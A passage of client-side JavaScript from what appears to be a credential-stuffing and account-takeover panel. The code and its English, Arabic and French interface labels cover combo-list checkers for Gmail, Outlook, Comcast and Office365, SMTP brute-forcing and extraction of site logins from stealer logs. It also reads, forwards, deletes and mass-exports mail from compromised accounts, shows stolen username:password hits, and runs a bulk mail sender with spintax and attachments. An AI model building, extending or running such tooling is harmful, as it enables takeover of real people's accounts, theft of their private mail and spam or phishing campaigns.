            } else if (sortVal === 'date-asc') {
                return parseMailDate(a.date) - parseMailDate(b.date);
            } else if (sortVal === 'sender-asc') {
                return (a.from || '').localeCompare(b.from || '');
            } else if (sortVal === 'sender-desc') {
                return (b.from || '').localeCompare(a.from || '');
            } else if (sortVal === 'subject-asc') {
                return (a.sub || '').localeCompare(b.sub || '');
            }
            return 0;
        });

        var html = "";
        msgs.forEach(function(m) {
            var safeId = m.id.toString().replace(/'/g, "\\'");
            var displayId = m.id.toString().replace(/"/g, '&quot;');
            html += '<div class="mail-item" data-id="'+displayId+'" onclick="loadB(this.getAttribute(\'data-id\'),this)">' +
                    '<div style="display:flex; gap:12px; align-items:flex-start;">' +
                    '<input type="checkbox" class="v-check" onclick="event.stopPropagation()" style="width:14px; height:14px; margin-top:2px; cursor:pointer;">' +
                    '<div style="flex:1; min-width:0;">' +
                    '<div style="font-weight:700; color:var(--accent); font-size:0.8rem; margin-bottom:4px;">'+(m.from||'')+'</div>' +
                    '<div style="font-weight:600; font-size:0.85rem; margin-bottom:4px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">'+(m.sub||'(No Subject)')+'</div>' +
                    '<div style="font-size:0.7rem; color:var(--text-secondary);">'+(m.date||'')+'</div></div></div></div>';
        });

        document.getElementById('msgs-list').innerHTML = html || '<div style="padding:20px; color:var(--text-secondary);">No messages found in this folder.</div>';
    }

    async function checkForNewEmails() {
        if (!curH || !curF) return;
        try {
            var url = "";
            if (isOwaMode) {
                var fid = curOwaFolderMap[curF] || 'inbox';
                url = '/api/mail/owa/messages?hit=' + encodeURIComponent(curH) + '&folder_id=' + encodeURIComponent(fid) + '&page=1';
            } else {
                var ps = document.getElementById('v-ps') ? document.getElementById('v-ps').value : '50';
                url = '/api/mail/messages?hit=' + encodeURIComponent(curH) + '&folder=' + encodeURIComponent(curF) + '&page=1&q=ALL&ps=' + ps;
                if (curSrv) url += '&srv=' + encodeURIComponent(curSrv) + '&port=' + curPort;
            }
            var r = await fetch(url);
            var d = await r.json();
            if (d.error || !d.msgs) return;

            var existingIds = new Set(currentMessages.map(m => m.id.toString()));
            var newMsgs = [];
            
            d.msgs.forEach(function(m) {
                if (m.id && !existingIds.has(m.id.toString())) {
                    newMsgs.push(m);
                }
            });

            if (newMsgs.length > 0) {
                newMsgs.forEach(function(m) {
                    var notifyMsg = "📩 New email from: " + (m.from || "Unknown") + "\nSubject: " + (m.sub || "(No Subject)");
                    showNotify(notifyMsg, "success");
                    
                    if (Notification.permission === "granted") {
                        new Notification("New Email Received", {
                            body: "From: " + (m.from || "Unknown") + "\n" + (m.sub || ""),
                            icon: "logo.jpg"
                        });
                    }
                });

                if (Notification.permission === "default") {
                    Notification.requestPermission();
                }

                currentMessages = newMsgs.concat(currentMessages);
                renderCurrentMessages();
            }
        } catch (e) {
            console.error("Auto-sync error:", e);
        }
    }

    async function loadM(f, el, p){
        if (mailRefreshTimer) {
            clearInterval(mailRefreshTimer);
            mailRefreshTimer = null;
        }

        if(isOwaMode){
            if(p < 1) return;
            curF = f; curP = p || 1;
            if(el && el.classList && el.classList.contains('f-item')){
                document.querySelectorAll('.f-item').forEach(x=>x.classList.remove('active'));
                el.classList.add('active');
            }
            var fid = curOwaFolderMap[f] || 'inbox';
            curFolderId = fid;
            var q_raw = document.getElementById('v-search').value;
            document.getElementById('msgs-list').innerHTML = '<div style="padding:20px; color:var(--accent); font-weight:700;">FETCHING VIA OWA...</div>';
            try {
                var url = '/api/mail/owa/messages?hit='+encodeURIComponent(curH)+'&folder_id='+encodeURIComponent(fid)+'&page='+curP;
                if(q_raw) url += '&q='+encodeURIComponent(q_raw);
                var r = await fetch(url);
                var d = await r.json();
                if(d.error) throw new Error(d.error);
                
                currentMessages = d.msgs || [];
                renderCurrentMessages();
                mailRefreshTimer = setInterval(checkForNewEmails, 12000);
            } catch(e) {
                document.getElementById('msgs-list').innerHTML = '<div style="padding:20px; color:var(--danger);">OWA Error: '+e.message+'</div>';
            }
            return;
        }
        if(p < 1) return; 
        curF = f;
        curP = p || 1;

        if(el && el.classList.contains('f-item')){
            document.querySelectorAll('.f-item').forEach(x=>x.classList.remove('active'));
            el.classList.add('active');
        }
        
        var q_sub = document.getElementById('v-search').value;
        var ps = document.getElementById('v-ps').value;
        document.getElementById('msgs-list').innerHTML = '<div style="padding:20px; color:var(--accent); font-weight:700;">FETCHING MESSAGES...</div>';
        
        var final_q = q_sub ? 'OR SUBJECT "' + q_sub + '" BODY "' + q_sub + '"' : "ALL";
        
        try {
            var url = '/api/mail/messages?hit='+encodeURIComponent(curH)+'&folder='+encodeURIComponent(f)+'&page='+curP+'&q='+encodeURIComponent(final_q.trim())+'&ps='+ps;
            if(curSrv) url += '&srv='+encodeURIComponent(curSrv)+'&port='+curPort;
            var r = await fetch(url);
            var d = await r.json();
            if(d.error) throw new Error(d.error);
            
            currentMessages = d.msgs || [];
            renderCurrentMessages();
            mailRefreshTimer = setInterval(checkForNewEmails, 12000);
        } catch(e) {
            document.getElementById('msgs-list').innerHTML = '<div style="padding:20px; color:var(--danger);">Sync Error: '+e.message+'</div>';
        }
    }

    var v_data = null; var v_mode = 'html';
    async function loadBOWA(id, el){
        curB = id;
        document.querySelectorAll('.mail-item').forEach(x=>x.classList.remove('active'));
        if (el) el.classList.add('active');
        document.getElementById('body-view').innerHTML = '<div style="height:100%; display:flex; align-items:center; justify-content:center; color:var(--accent);">DECRYPTING VIA OWA...</div>';
        try {
            var r = await fetch('/api/mail/owa/body?hit='+encodeURIComponent(curH)+'&msg_id='+encodeURIComponent(id));
            v_data = await r.json();
            if(v_data.error){ document.getElementById('body-view').innerHTML = '<div style="padding:40px; color:var(--danger); font-weight:800;">OWA ERROR: '+v_data.error+'</div>'; return; }
            v_mode = v_data.html ? 'html' : 'text';
            renderBody();
            document.getElementById('v-body-head').style.display = 'flex'
            document.getElementById('v-body-meta').innerText = (v_data.from||'') + ' - ' + (v_data.sub||'');
        } catch(e) {
            document.getElementById('body-view').innerHTML = '<div style="padding:40px; color:var(--danger);">FATAL OWA ERROR</div>';
        }
    }
    async function fwdM(){
        var t = prompt("Forward to email:"); if(!t) return;
        var r = await fetch('/api/mail/forward', {method:'POST', body:JSON.stringify({hit:curH, folder:curF, mid:curB, target:t})});
        var d = await r.json(); alert(d.ok ? "Forwarded!" : "Error: " + d.error);
    }

    async function delM(){
        if(!confirm("Delete this email permanently?")) return;
        var r = await fetch('/api/mail/delete?hit='+encodeURIComponent(curH)+'&folder='+encodeURIComponent(curF)+'&mid='+curB);
        var d = await r.json(); if(d.ok){ alert("Deleted!"); loadM(curF); document.getElementById('body-view').innerHTML = "Deleted."; } else alert(d.error);
    }
    
    var curB = null;
    async function loadB(id, el){
        if(isOwaMode){ loadBOWA(id, el); return; }
        curB = id;
        var items = document.querySelectorAll('.mail-item');
        for(var i=0; i<items.length; i++) items[i].classList.remove('active');
        if (el) el.classList.add('active');
        document.getElementById('body-view').innerHTML = '<div style="height:100%; display:flex; align-items:center; justify-content:center; color:var(--accent);">DECRYPTING...</div>';
        try {
            var url = '/api/mail/body?hit='+encodeURIComponent(curH)+'&folder='+encodeURIComponent(curF)+'&mid='+id;
            if(curSrv) url += '&srv='+encodeURIComponent(curSrv)+'&port='+curPort;
            var r = await fetch(url);
            v_data = await r.json();
            if(v_data.error){
                document.getElementById('body-view').innerHTML = '<div style="padding:40px; color:var(--danger); font-weight:800;">ERROR: '+v_data.error+'</div>';
                return;
            }
            v_mode = v_data.html ? 'html' : 'text';
            renderBody();
            document.getElementById('v-body-head').style.display = 'flex';
            document.getElementById('v-body-meta').innerText = (v_data.from || '') + " - " + (v_data.sub || '');
        } catch(e) {
            document.getElementById('body-view').innerHTML = '<div style="padding:40px; color:var(--danger);">FATAL ERROR</div>';
        }
    }

    function toggleMode(){
        v_mode = v_mode == 'html' ? 'text' : 'html';
        renderBody();
    }

    function renderBody(){
        var bv = document.getElementById('body-view');
        if(!v_data) return;
        var c = (v_mode == 'html' ? (v_data.html || v_data.text) : v_data.text) || "";
        if(v_mode == 'html' && (v_data.html || !v_data.text)){
            bv.innerHTML = '<iframe id="msg-iframe" style="width:100%; height:100%; border:none; background:#fff;"></iframe>';
            var f = document.getElementById('msg-iframe');
            var d = f.contentDocument || f.contentWindow.document;
            d.open(); d.write(c); d.close();
        } else {
            bv.innerHTML = '<div style="padding:24px; white-space:pre-wrap; font-family:\'JetBrains Mono\', monospace; color:#000; font-size:0.9rem; height:100%; overflow-y:auto; background:#fff;">' + c + '</div>';
        }
    }

    async function downloadViewed(){
        if(!v_data) { alert("Load a message first!"); return; }
        var content = v_data.html || v_data.text;
        var b = new Blob([content], {type:'text/html'});
        var a = document.createElement('a'); a.href = URL.createObjectURL(b);
        a.download = "Mail_" + curB + ".html"; a.click();
    }

    function loadHist(){
        var h = document.getElementById('h-list');
        h.innerHTML = "<div>Loading history from database...</div>";
        fetch('/api/history').then(r=>r.json()).then(res=>{
            var html = "";
            for(var i=0; i<res.length; i++) {
                html += "<div><span style='color:var(--text-secondary);'>[" + res[i].time + "]</span> <span style='color:var(--accent);'>" + res[i].user + ":" + res[i].pass + "</span> <span style='font-size:0.7rem;'>[" + res[i].proto + "@" + res[i].srv + "]</span></div>";
            }
            h.innerHTML = html || "<div>No database history found.</div>";
        }).catch(e=>{
            h.innerHTML = "<div>Error loading history.</div>";
        });
    }

    async function loadSettings(){
        try {
            var r = await fetch('/api/settings');
            var d = await r.json();
            document.getElementById('cfg_max_retries').value = d.max_retries;
            document.getElementById('cfg_retry_delay').value = d.retry_delay;
            document.getElementById('cfg_timeout').value = d.timeout;
            document.getElementById('sms_enabled').checked = d.sms_enabled;
            document.getElementById('sms_phone').value = d.sms_phone || '';
            document.getElementById('sms_smtp_host').value = d.sms_smtp_host || '';
            document.getElementById('sms_smtp_port').value = d.sms_smtp_port || 587;
            document.getElementById('sms_smtp_user').value = d.sms_smtp_user || '';
            document.getElementById('sms_smtp_pass').value = d.sms_smtp_pass || '';
            document.getElementById('sms_smtp_sec').value = d.sms_smtp_sec || 'TLS';
        } catch(e) { showNotify("Failed to load settings", "error"); }
    }

    async function saveSettings(){
        var d = {
            max_retries: parseInt(document.getElementById('cfg_max_retries').value),
            retry_delay: parseInt(document.getElementById('cfg_retry_delay').value),
            timeout: parseInt(document.getElementById('cfg_timeout').value),
            sms_enabled: document.getElementById('sms_enabled').checked,
            sms_phone: document.getElementById('sms_phone').value,
            sms_smtp_host: document.getElementById('sms_smtp_host').value,
            sms_smtp_port: parseInt(document.getElementById('sms_smtp_port').value),
            sms_smtp_user: document.getElementById('sms_smtp_user').value,
            sms_smtp_pass: document.getElementById('sms_smtp_pass').value,
            sms_smtp_sec: document.getElementById('sms_smtp_sec').value
        };
        try {
            var r = await fetch('/api/settings', {method:'POST', body:JSON.stringify(d)});
            var res = await r.json();
            if(res.ok) showNotify("Settings saved successfully!", "success");
            else showNotify("Error saving settings", "error");
        } catch(e) { showNotify("Request failed: " + e.message, "error"); }
    }

    async function saveMapping(){
        var d = {
            domain: document.getElementById('map_dom').value,
            imap_host: document.getElementById('map_ih').value,
            imap_port: parseInt(document.getElementById('map_ip').value),
            pop_host: document.getElementById('map_ph').value,
            pop_port: parseInt(document.getElementById('map_pp').value),
            smtp_host: document.getElementById('map_sh').value,
            smtp_port: parseInt(document.getElementById('map_sp').value)
        };
        if(!d.domain || !d.imap_host || !d.smtp_host){
            showNotify("Domain, IMAP Host, and SMTP Host are required", "error");
            return;
        }
        try {
            var r = await fetch('/api/domain/mapping', {method:'POST', body:JSON.stringify(d)});
            var res = await r.json();
            if(res.ok) {
                showNotify("Domain mapping saved!", "success");
                document.getElementById('map_dom').value = "";
            } else showNotify("Error: " + res.error, "error");
        } catch(e) { showNotify("Request failed", "error"); }
    }

    var extInt = null;
    function startULPExtract(){
        var p = document.getElementById('ulp_file_path').value;
        var k = document.getElementById('ulp_keyword').value;
        var e = document.getElementById('ulp_only_emails').checked;
        if(!p) { showNotify("Select ULP file first", "error"); return; }
        
        fetch('/api/extractor/ulp', {
            method: 'POST',
            body: JSON.stringify({path:p, keyword:k, only_emails:e})
        }).then(r=>r.json()).then(res=>{
            if(res.ok){
                showNotify("ULP Extraction Started!", "success");
                document.getElementById('ext_status_box').style.display = 'block';
                if(extInt) clearInterval(extInt);
                extInt = setInterval(updateExtractorStats, 1000);
            } else showNotify(res.error, "error");
        });
    }

    function updateExtractorStats(){
        fetch('/api/extractor/stats').then(r=>r.json()).then(d=>{
            document.getElementById('e_lines').innerText = d.checked.toLocaleString();
            document.getElementById('e_hits').innerText = d.hits.toLocaleString();
            if(!d.running) {
                clearInterval(extInt);
                showNotify("Extraction Complete!", "info");
                document.getElementById('btn-ulp-start').innerText = "START ULP EXTRACTION";
            }
        });
    }

    function startSorter(type){
        let p = document.getElementById('sort_file_path').value;
        let txt = document.getElementById('sort_input').value;
        let custom = document.getElementById('sort_custom_domains').value;
        
        if(!p && !txt) { showNotify("Select a file or paste combos!", "error"); return; }
        
        // If it's a small paste and no custom filter, we can still use the local sortCombos
        if(!p && txt.length < 50000 && !custom) {
            sortCombos(type);
            return;
        }

        fetch('/api/sorter/start', {
            method: 'POST',
            body: JSON.stringify({path:p, text:txt, type:type, custom:custom})
        }).then(r=>r.json()).then(res=>{
            if(res.ok){
                showNotify("Sorting Started! Check 'Hits_by_Keyword' folder for results.", "success");
                document.getElementById('ext_status_box').style.display = 'block';
                if(extInt) clearInterval(extInt);
                extInt = setInterval(updateExtractorStats, 1000);
            } else showNotify(res.error, "error");
        });
    }

    function sortCombos(type){
        let input = document.getElementById('sort_input').value;
        let lines = input.split('\n').filter(l => l.trim().includes(':'));
        if(lines.length === 0) return;
        
        if(type === 'domain'){
            lines.sort((a,b) => {
                let domA = a.split(':')[0].split('@')[1] || "zzzz";
                let domB = b.split(':')[0].split('@')[1] || "zzzz";
                return domA.localeCompare(domB);
            });
        } else if(type === 'country'){
            lines.sort((a,b) => {
                let domA = a.split(':')[0].split('@')[1] || "";
                let domB = b.split(':')[0].split('@')[1] || "";
                let tldA = domA.split('.').pop() || "zzzz";
                let tldB = domB.split('.').pop() || "zzzz";
                return tldA.localeCompare(tldB);
            });
        }
        document.getElementById('sort_input').value = lines.join('\n');
        showNotify("Sorted " + lines.length + " combos by " + type, "success");
    }

    function saveSorted(){
        let txt = document.getElementById('sort_input').value;
        if(!txt) return;
        let blob = new Blob([txt], {type: 'text/plain'});
        let a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'sorted_combos_' + Date.now() + '.txt';
        a.click();
    }

    async function clearD(){
        await fetch('/api/clear', {method:'POST'});
        document.getElementById('live').innerHTML = "";
        showNotify("Dashboard stats cleared.", "success");
    }

    async function clearFullDatabase(){
        if(!confirm("Are you sure you want to clear the hits history? Your settings and custom domain mappings will be kept.")) return;
        try {
            var r = await fetch('/api/clear-database', {method:'POST'});
            var d = await r.json();
            if(d.ok){
                showNotify("Database cleared successfully.", "success");
                loadHist();
                if(typeof loadH === 'function') loadH(1);
            } else {
                showNotify("Error: " + d.error, "error");
            }
        } catch(e) {
            showNotify("Request failed: " + e.message, "error");
        }
    }

    var state_history = [];

    async function downloadAllChecked(){
        var boxes = document.querySelectorAll('.v-check:checked');
        if(boxes.length == 0){ alert("Select emails to export first!"); return; }
        document.getElementById('body-view').innerHTML = '<div style="padding:30px; color:var(--accent);">COMPILING MASS REPORT ('+boxes.length+')...</div>';
        var report_html = "<html><body style='background:#111; color:#ccc; font-family:sans-serif;'><h1>Forensic Mass Report</h1>";
        for(var i=0; i<boxes.length; i++){
            var mid = boxes[i].closest('.mail-item').getAttribute('data-id');
            var r = await fetch('/api/mail/body?hit='+encodeURIComponent(curH)+'&folder='+encodeURIComponent(curF)+'&mid='+mid);
            var d = await r.json();
            report_html += "<hr><h3>FROM: "+d.from+"</h3><h4>SUB: "+d.sub+"</h4><div style='background:#eee; color:#000; padding:20px; border-radius:10px;'>" + (d.html || d.text) + "</div>";
        }
        report_html += "</body></html>";
        var b = new Blob([report_html], {type:'text/html'});
        var a = document.createElement('a'); a.href = URL.createObjectURL(b);
        a.download = "Mass_Export_" + Date.now() + ".html"; a.click();
        document.getElementById('body-view').innerHTML = "Batch Export Finished.";
    }

    function toggleAllMsgs(){
        var boxes = document.querySelectorAll('.v-check');
        var main = document.getElementById('sel-all').checked;
        for(var i=0; i<boxes.length; i++) boxes[i].checked = main;
    }

    var dict = {
        "EN": {
            "nav-scan-text": "SCANNER", "nav-acc-text": "ACCOUNTS", "nav-man-text": "MANUAL", "nav-view-text": "VIEWER", 
            "nav-smtp-text": "SMTP CHECKER", "nav-send-text": "SENDER", "nav-sms-send-text": "SMS SENDER", "nav-search-text-global": "SEARCH ALL", 
            "nav-outlook-text": "OUTLOOK CHK", "nav-comcast-text": "COMCAST CHK", "nav-office365-text": "OFFICE365 CHK", "nav-gmail-text": "GMAIL CHK",
            "nav-hist-text": "HISTORY", "nav-settings-text": "SETTINGS", "nav-extract-text": "EXTRACTORS",
            "title-gmail": "Gmail Direct Checker (No WebAuth)", "lbl-gmail-combos": "GMAIL ACCOUNTS (EMAIL:PASSWORD)", "btn-gmail-start": "Start Gmail Checker", "btn-gmail-stop": "Stop", "btn-gmail-clear": "Clear",
            "title-extractors": "High-Speed ULP & Combo Extractor", "title-ulp-ext": "ULP to Email:Pass (5GB+ Support)", "lbl-ulp-file": "ULP FILE PATH (URL:LOGIN:PASS)",
            "lbl-ulp-keyword": "TARGET WEBSITE / KEYWORD (e.g. walmart, netflix, .it)", "lbl-only-emails": "ONLY EXTRACT EMAIL:PASS (Skip usernames)",
            "btn-ulp-start": "START ULP EXTRACTION", "title-combo-sort": "Email:Pass Domain Sorter", "lbl-sort-input": "PASTE COMBOS OR LOAD FILE",
            "btn-scan-d": "Discover Domains", "btn-clear-dash": "Clear", "btn-start": "Start Checker", "btn-stop": "Stop Engine", "btn-clear-session": "Clear Session",
            "btn-manual-connect": "Connect & View Inbox", "btn-acc-prev": "PREV", "btn-acc-next": "NEXT",
            "btn-view-batch": "Download Batch", "btn-view-prev": "Prev", "btn-view-next": "Next", "btn-toggle-type": "HTML/TEXT",
            "btn-view-fwd": "FORWARD", "btn-view-del": "DELETE", "btn-view-down": "DOWNLOAD",
            "btn-clear-db": "CLEAR DATABASE", "btn-smtp-browse": "BROWSE", "btn-combo-browse": "BROWSE", "btn-smtp-fast-ext": "High-Speed Extract From Local File",
            "btn-smtp-ext": "Extract SMTP from Email:Pass", "btn-smtp-start": "Start SMTP Checker", "btn-smtp-stop": "Stop Engine",
            "btn-comcast-clear": "Clear", "btn-comcast-start": "Start Comcast Checker", "btn-comcast-stop": "Stop",
            "btn-office-clear": "Clear", "btn-office-start": "Start Office365 Checker", "btn-office-stop": "Stop",
            "btn-send-load-emails": "Load Emails.txt", "btn-send-load-body": "Load Letter.html", "btn-send-load-smtps": "Load Live SMTPs",
            "btn-send-start": "Start Sending", "btn-send-stop": "Stop", "btn-gs-start": "START SCAN", "btn-gs-stop": "STOP",
            "btn-out-start": "Start Outlook Checker", "btn-out-stop": "Stop",
            "title-mass-discovery": "Mass Discovery Engine", "title-manual": "Single Connection", "title-validated": "Validated Accounts",
            "title-smtp": "SMTP Validator", "title-comcast": "Comcast SMTP Checker", "title-office": "Office365/Outlook Checker",
            "title-sender": "Bulk Mail Sender", "title-global-search": "Global Keyword Search", "title-outlook": "Outlook Checker",
            "hist-title": "Hits History", "lbl-threads": "THREADS", "lbl-combos": "COMBO LIST (USER:PASS)", "lbl-target-combo": "TARGET COMBO",
            "lbl-combo-file": "OR LOAD FROM FILE (Full path to .txt)",
            "lbl-target-session": "Target Session:", "lbl-select-account": "Select Account First", "lbl-select-msg": "Select a message to display the content",
            "lbl-smtp-threads": "THREADS", "lbl-brute-ports": "BRUTE PORTS (25, 2525, 465, 587)", "lbl-smtp-combos": "SMTP COMBOS (HOST:PORT:USER:PASS or USER:PASS)",
            "lbl-ultra-fast": "ULTRA-FAST EXTRACTION (FOR 10GB+ FILES)", "lbl-pro-tip": "PRO TIP:", "lbl-status-comcast": "Status",
            "lbl-comcast-combos": "COMCAST ACCOUNTS (EMAIL:PASSWORD)", "lbl-comcast-title": "⚡ COMCAST CHECKER", "lbl-comcast-desc": "Tests SMTP connectivity via:",
            "lbl-status-office": "Status", "lbl-office-combos": "OFFICE365 ACCOUNTS (EMAIL:PASSWORD)", "lbl-office-title": "⚡ OFFICE365 CHECKER",
            "lbl-recipient-list": "RECIPIENT LIST", "lbl-smtp-list": "SMTP LIST (AUTO-LOADED FROM LIVE)", "lbl-letter-settings": "LETTER SETTINGS (Supports Spintax: {Hello|Hi})",
            "lbl-live-preview": "LIVE HTML PREVIEW", "lbl-attachment": "ATTACHMENT (.html, .txt, .pdf)", "lbl-send-delay": "SEND DELAY", "lbl-sec-per-email": "SECONDS PER EMAIL",
            "lbl-send-threads": "THREADS", "lbl-send-retries": "MAX SMTP TRIES", "lbl-retries-hint": "0 = Test ALL SMTPs.", "lbl-gs-scan-prefix": "System will scan",
            "lbl-gs-scan-suffix": "total accounts from your Valid.txt file.", "lbl-gs-total": "TOTAL", "lbl-gs-matches": "MATCHES", "lbl-gs-hint": "Enter a keyword to search across all validated accounts.",
            "lbl-out-threads": "THREADS", "lbl-out-keywords": "🔑 KEYWORDS (Optional - Leave empty to just verify login)", "lbl-out-combos": "COMBO LIST (USER:PASS)",
            "lbl-out-how": "ℹ️ How it works:", "lbl-out-how-desc": "• If keywords are empty → Just validates login (fast)<br/>• If keywords provided → Validates login + searches inbox for keywords",
            "title-settings": "Core Engine Settings", "lbl-max-retries": "MAX RETRIES (Smart Exponential Backoff)", "lbl-retry-delay": "RETRY DELAY (Base seconds)", 
            "lbl-conn-timeout": "CONNECTION TIMEOUT (Seconds)", "btn-save-settings": "SAVE CONFIGURATION",
            "title-domain-mapping": "Custom Domain Mapping", "btn-save-mapping": "ADD MAPPING", "lbl-mapping-desc": "Use this to fix domains that aren't auto-discovered. Settings are saved permanently."
        },
        "AR": {
            "nav-scan-text": "الفاحص", "nav-acc-text": "الحسابات", "nav-man-text": "يدوي", "nav-view-text": "المشاهد", 
            "nav-smtp-text": "فاحص SMTP", "nav-send-text": "المرسل", "nav-search-text-global": "البحث الشامل", 
            "nav-outlook-text": "فاحص أوتلوك", "nav-comcast-text": "فاحص كومكاست", "nav-office365-text": "فاحص أوفيس", 
            "nav-hist-text": "السجلات", "nav-settings-text": "الإعدادات", "nav-extract-text": "المستخرج",
            "btn-scan-d": "اكتشاف النطاقات", "btn-clear-dash": "مسح", "btn-start": "بدء الفحص", "btn-stop": "إيقاف المحرك", "btn-clear-session": "مسح الجلسة",
            "btn-manual-connect": "الاتصال وعرض البريد", "btn-acc-prev": "السابق", "btn-acc-next": "التالي",
            "btn-view-batch": "تحميل الدفعة", "btn-view-prev": "السابق", "btn-view-next": "التالي", "btn-toggle-type": "نص/HTML",
            "btn-view-fwd": "إعادة توجيه", "btn-view-del": "حذف", "btn-view-down": "تحميل",
            "btn-clear-db": "مسح قاعدة البيانات", "btn-smtp-browse": "تصفح", "btn-combo-browse": "تصفح", "btn-smtp-fast-ext": "استخراج عالي السرعة من ملف محلي",
            "btn-smtp-ext": "استخراج SMTP من البريد", "btn-smtp-start": "بدء فحص SMTP", "btn-smtp-stop": "إيقاف المحرك",
            "btn-comcast-clear": "مسح", "btn-comcast-start": "بدء فحص كومكاست", "btn-comcast-stop": "إيقاف",
            "btn-office-clear": "مسح", "btn-office-start": "بدء فحص أوفيس", "btn-office-stop": "إيقاف",
            "btn-send-load-emails": "تحميل القائمة", "btn-send-load-body": "تحميل الرسالة", "btn-send-load-smtps": "تحميل SMTP",
            "btn-send-start": "بدء الإرسال", "btn-send-stop": "إيقاف", "btn-gs-start": "بدء البحث", "btn-gs-stop": "إيقاف",
            "btn-out-start": "بدء فحص أوتلوك", "btn-out-stop": "إيقاف",
            "title-mass-discovery": "محرك الاكتشاف الشامل", "title-manual": "اتصال فردي", "title-validated": "الحسابات المفحوصة",
            "title-smtp": "مدقق SMTP", "title-comcast": "فاحص كومكاست SMTP", "title-office": "فاحص أوفيس/أوتلوك",
            "title-sender": "مرسل البريد الجماعي", "title-global-search": "البحث الشامل بالكلمات", "title-outlook": "فاحص أوتلوك",
            "hist-title": "سجل النتائج", "lbl-threads": "خيوط المعالجة", "lbl-combos": "قائمة الحسابات (بريد:كلمة سر)", "lbl-combo-file": "أو تحميل من ملف (المسار الكامل لملف .txt)", "lbl-target-combo": "الحساب المستهدف",
            "lbl-target-session": "الجلسة الحالية:", "lbl-select-account": "اختر حساباً أولاً", "lbl-select-msg": "اختر رسالة لعرض محتواها",
            "lbl-smtp-threads": "خيوط المعالجة", "lbl-brute-ports": "فحص المنافذ (25, 2525, 465, 587)", "lbl-smtp-combos": "حسابات SMTP",
            "lbl-ultra-fast": "استخراج فائق السرعة (للملفات الضخمة 10GB+)", "lbl-pro-tip": "نصيحة للمحترفين:", "lbl-status-comcast": "الحالة",
            "lbl-comcast-combos": "حسابات كومكاست", "lbl-comcast-title": "⚡ فاحص كومكاست", "lbl-comcast-desc": "فحص اتصال SMTP عبر:",
            "lbl-status-office": "الحالة", "lbl-office-combos": "حسابات أوفيس 365", "lbl-office-title": "⚡ فاحص أوفيس",
            "lbl-recipient-list": "قائمة المستلمين", "lbl-smtp-list": "قائمة SMTP (محملة تلقائياً)", "lbl-letter-settings": "إعدادات الرسالة (يدعم Spintax)",
            "lbl-live-preview": "معاينة مباشرة", "lbl-attachment": "المرفقات (.html, .txt, .pdf)", "lbl-send-delay": "تأخير الإرسال", "lbl-sec-per-email": "ثانية لكل رسالة",
            "lbl-send-threads": "خيوط المعالجة", "lbl-send-retries": "أقصى محاولات SMTP", "lbl-retries-hint": "0 = تجربة جميع SMTP.", "lbl-gs-scan-prefix": "سيقوم النظام بفحص",
            "lbl-gs-scan-suffix": "حساب من ملفاتك.", "lbl-gs-total": "الإجمالي", "lbl-gs-matches": "التطابقات", "lbl-gs-hint": "أدخل كلمة للبحث في جميع الحسابات المفحوصة.",
            "lbl-out-threads": "خيوط المعالجة", "lbl-out-keywords": "🔑 كلمات البحث (اختياري - اترك فارغاً لفحص الدخول فقط)", "lbl-out-combos": "قائمة الحسابات",
            "lbl-out-how": "ℹ️ كيف يعمل:", "lbl-out-how-desc": "• إذا كانت الكلمات فارغة ← فحص الدخول فقط (سريع)<br/>• إذا تم توفير كلمات ← فحص الدخول + البحث في البريد",
            "title-extractors": "مستخرج ULP والكومبو فائق السرعة", "title-ulp-ext": "تحويل ULP إلى بريد:باس (دعم 5GB+)", "lbl-ulp-file": "مسار ملف ULP (URL:LOGIN:PASS)",
            "lbl-ulp-keyword": "الموقع المستهدف / الكلمة المفتاحية (مثلاً walmart, netflix, .it)", "lbl-only-emails": "استخراج البريد:باس فقط (تخطي أسماء المستخدمين)",
            "btn-ulp-start": "بدء استخراج ULP", "title-combo-sort": "فرز الكومبو حسب النطاق", "lbl-sort-input": "الصق الكومبو أو حمل ملفاً"
        },
        "FR": {
            "nav-scan-text": "SCANNER", "nav-acc-text": "COMPTES", "nav-man-text": "MANUEL", "nav-view-text": "VISU", 
            "nav-smtp-text": "SMTP CHECKER", "nav-send-text": "EXPÉDITEUR", "nav-search-text-global": "TOUT RECHERCHER", 
            "nav-outlook-text": "OUTLOOK CHK", "nav-comcast-text": "COMCAST CHK", "nav-office365-text": "OFFICE365 CHK", 
            "nav-hist-text": "HISTOIRE", "nav-settings-text": "PARAMÈTRES", "nav-extract-text": "EXTRACTEURS",
            "btn-scan-d": "Découvrir Domaines", "btn-clear-dash": "Effacer", "btn-start": "Démarrer Checker", "btn-stop": "Arrêter Moteur", "btn-clear-session": "Effacer Session",
            "btn-manual-connect": "Connexion & Voir Inbox", "btn-acc-prev": "PRÉC", "btn-acc-next": "SUIV",
            "btn-view-batch": "Téléchargement Batch", "btn-view-prev": "Préc", "btn-view-next": "Suiv", "btn-toggle-type": "HTML/TEXT",
            "btn-view-fwd": "TRANSFÉRER", "btn-view-del": "SUPPRIMER", "btn-view-down": "TÉLÉCHARGER",
            "btn-clear-db": "EFFACER LA BASE", "btn-smtp-browse": "PARCOURIR", "btn-combo-browse": "PARCOURIR", "btn-smtp-fast-ext": "Extraction Rapide Fichier Local",
            "btn-smtp-ext": "Extraire SMTP de Email:Pass", "btn-smtp-start": "Démarrer SMTP Checker", "btn-smtp-stop": "Arrêter Moteur",
            "btn-comcast-clear": "Effacer", "btn-comcast-start": "Démarrer Comcast Checker", "btn-comcast-stop": "Arrêter",
            "btn-office-clear": "Effacer", "btn-office-start": "Démarrer Office365 Checker", "btn-office-stop": "Arrêter",
            "btn-send-load-emails": "Charger Emails.txt", "btn-send-load-body": "Charger Lettre.html", "btn-send-load-smtps": "Charger Live SMTPs",
            "btn-send-start": "Démarrer Envoi", "btn-send-stop": "Arrêter", "btn-gs-start": "DÉMARRER SCAN", "btn-gs-stop": "ARRÊTER",
            "btn-out-start": "Démarrer Outlook Checker", "btn-out-stop": "Arrêter",
            "title-mass-discovery": "Moteur de Découverte", "title-manual": "Connexion Unique", "title-validated": "Comptes Validés",
            "title-smtp": "Validateur SMTP", "title-comcast": "Checker Comcast SMTP", "title-office": "Checker Office365/Outlook",
            "title-sender": "Envoi de Mail en Masse", "title-global-search": "Recherche Globale", "title-outlook": "Checker Outlook",
            "hist-title": "Historique des Hits", "lbl-threads": "THREADS", "lbl-combos": "LISTE COMBO (USER:PASS)", "lbl-combo-file": "OU CHARGER DEPUIS FICHIER (Chemin complet .txt)", "lbl-target-combo": "COMBO CIBLE",
